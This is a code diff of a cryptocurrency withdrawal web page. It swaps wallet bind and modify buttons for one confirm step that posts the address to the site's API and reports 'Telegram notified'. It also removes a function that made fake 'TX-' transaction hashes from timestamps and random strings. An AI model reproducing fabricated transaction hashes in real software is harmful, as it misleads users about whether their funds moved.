@@ -28,8 +28,10 @@ button:disabled{background:#555;cursor:not-allowed;}
 
 <label for="cryptoSelect">Select Cryptocurrency</label>
 <select id="cryptoSelect">
-<option value="BTCUSDT">BTC</option>
-<option value="ETHUSDT">ETH</option>
+<option value="BTC">BTC</option>
+<option value="ETH">ETH</option>
+<option value="USDT">USDT</option>
+<option value="BNB">BNB</option>
 </select>
 
 <label for="coinAmount">Enter Coin Amount</label>
@@ -42,16 +44,13 @@ button:disabled{background:#555;cursor:not-allowed;}
 <div class="button-row">
 <button id="createPwdBtn">Create Password</button>
 <button id="confirmPwdBtn">Confirm Password</button>
-<button id="forgotPwdBtn">Forgot Password</button>
 </div>
 
-<label for="wallet">Wallet Address</label>
-<input type="text" id="wallet" placeholder="Enter or bind wallet address">
-<div class="button-row">
-<button id="bindWalletBtn">Bind Wallet</button>
-<button id="editWalletBtn">Modify Wallet</button>
+<label for="wallet">Wallet Address (USDT only)</label>
+<input type="text" id="wallet" placeholder="Enter wallet address">
+<button id="confirmWalletBtn">Confirm Wallet Address</button>
+
 <button id="submitBtn" disabled>Submit Withdrawal</button>
-</div>
 
 <div id="txHashDisplay"></div>
 <button id="copyBtn">Copy Transaction Hash</button>
@@ -70,37 +69,18 @@ const usdtConverted=document.getElementById('usdtConverted');
 const feeDisplay=document.getElementById('feeDisplay');
 const submitBtn=document.getElementById('submitBtn');
 const walletInput=document.getElementById('wallet');
-const bindWalletBtn=document.getElementById('bindWalletBtn');
-const editWalletBtn=document.getElementById('editWalletBtn');
+const confirmWalletBtn=document.getElementById('confirmWalletBtn');
 const withdrawPwd=document.getElementById('withdrawPwd');
 const createPwdBtn=document.getElementById('createPwdBtn');
 const confirmPwdBtn=document.getElementById('confirmPwdBtn');
 const txHashDisplay=document.getElementById('txHashDisplay');
 const copyBtn=document.getElementById('copyBtn');
 
-function generateHash(){return 'TX-'+Date.now().toString(36)+'-'+Math.random().toString(36).substr(2,8);}
 function maskWallet(addr){return addr.slice(0,3)+'****'+addr.slice(-3);}
 function checkSubmitEnable(){
     const qty=parseFloat(coinAmount.value)||0;
     submitBtn.disabled=!(walletBound && pwdCreated && qty>0);
 }
-
-// 初始化钱包
-async function initWallet(){
-    try{
-        const res = await fetch(`${API_BASE}/api/wallet`);
-        if (!res.ok) throw new Error('Network error');
-        const data = await res.json();
-        if(data.wallet){
-            currentWallet=data.wallet;
-            walletInput.value = maskWallet(currentWallet);
-            walletInput.disabled = true;
-            walletBound = true;
-            checkSubmitEnable();
-        }
-    }catch(err){console.error(err);}
-}
-initWallet();
 
 coinAmount.addEventListener('input', ()=>{
     const qty=parseFloat(coinAmount.value)||0;
@@ -109,57 +89,7 @@ coinAmount.addEventListener('input', ()=>{
     checkSubmitEnable();
 });
 
-// 绑定钱包
-bindWalletBtn.addEventListener('click', async ()=>{
-    if(currentWallet){ alert('Wallet already bound. Use Modify Wallet.'); return; }
-    const val = walletInput.value.trim();
-    if(!val){ alert('Enter wallet'); return; }
-    try{
-        const res = await fetch(`${API_BASE}/api/wallet`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ wallet: val })
-        });
-        if (!res.ok) throw new Error('Network error');
-        const data = await res.json();
-        if(data.success){
-            currentWallet = data.wallet;
-            walletInput.value = maskWallet(currentWallet);
-            walletInput.disabled = true;
-            walletBound = true;
-            alert('Wallet bound successfully');
-            checkSubmitEnable();
-        } else {
-            alert(data.error);
-        }
-    }catch(err){ alert('Error: '+err.message); }
-});
-
-// 修改钱包
-editWalletBtn.addEventListener('click', async ()=>{
-    const newWallet = prompt('Enter new wallet address:');
-    if(!newWallet) return;
-    const oldWallet = currentWallet;
-    try{
-        const res = await fetch(`${API_BASE}/api/wallet`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ wallet:newWallet, oldWallet })
-        });
-        if (!res.ok) throw new Error('Network error');
-        const data = await res.json();
-        if(data.success){
-            currentWallet = data.wallet;
-            walletInput.value = maskWallet(currentWallet);
-            walletInput.disabled = true;
-            walletBound = true;
-            alert('Wallet updated successfully');
-            checkSubmitEnable();
-        } else alert(data.error);
-    }catch(err){ alert('Error: '+err.message); }
-});
-
-// 密码
+// 创建/确认密码
 createPwdBtn.addEventListener('click', ()=>{
     const val=withdrawPwd.value.trim();
     if(!val){ alert('Enter password'); return; }
@@ -171,6 +101,29 @@ createPwdBtn.addEventListener('click', ()=>{
 confirmPwdBtn.addEventListener('click', ()=>{
     if(!pwdCreated){ alert('Password not set'); return; }
     alert('Password confirmed');
+});
+
+// 确认钱包地址
+confirmWalletBtn.addEventListener('click', async ()=>{
+    const val = walletInput.value.trim();
+    if(!val){ alert('Enter wallet address'); return; }
+    try{
+        const res = await fetch(`${API_BASE}/api/wallet`, {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ wallet: val })
+        });
+        if(!res.ok) throw new Error('Network error');
+        const data = await res.json();
+        if(data.success){
+            currentWallet = data.wallet;
+            walletInput.value = maskWallet(currentWallet);
+            walletInput.disabled = true;
+            walletBound = true;
+            alert('Wallet confirmed and Telegram notified');
+            checkSubmitEnable();
+        } else alert(data.error);
+    }catch(err){ alert('Error: '+err.message); }
 });
 
 // 提现
